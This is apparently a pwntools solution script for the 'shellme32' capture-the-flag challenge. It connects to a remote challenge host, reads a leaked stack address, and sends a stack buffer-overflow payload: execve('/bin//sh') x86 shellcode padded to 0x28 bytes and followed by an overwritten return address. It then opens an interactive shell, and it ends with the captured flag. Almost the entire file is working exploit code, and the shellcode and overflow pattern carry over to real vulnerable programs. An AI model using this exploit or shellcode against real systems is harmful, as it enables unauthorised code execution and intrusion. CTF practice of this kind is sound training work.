from pwn import *

context.terminal = ['tmux', 'split-w', '-h']


gdbscript = '''
gef
# ret
b *0x5655627d
'''

# io = process("./shellme32")
io = remote("chal.tuctf.com", 30506)

# This shellcode sucks
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

io.recvuntil('?\n')
addr_stack = int(io.recvline(), 16)

payload = shellcode[:]
payload += b'A' * (0x28 - len(payload))
payload += p32(addr_stack)

io.send(payload)

io.interactive()

# TUCTF{4www..._b4by5_f1r57_3xpl017._h0w_cu73}
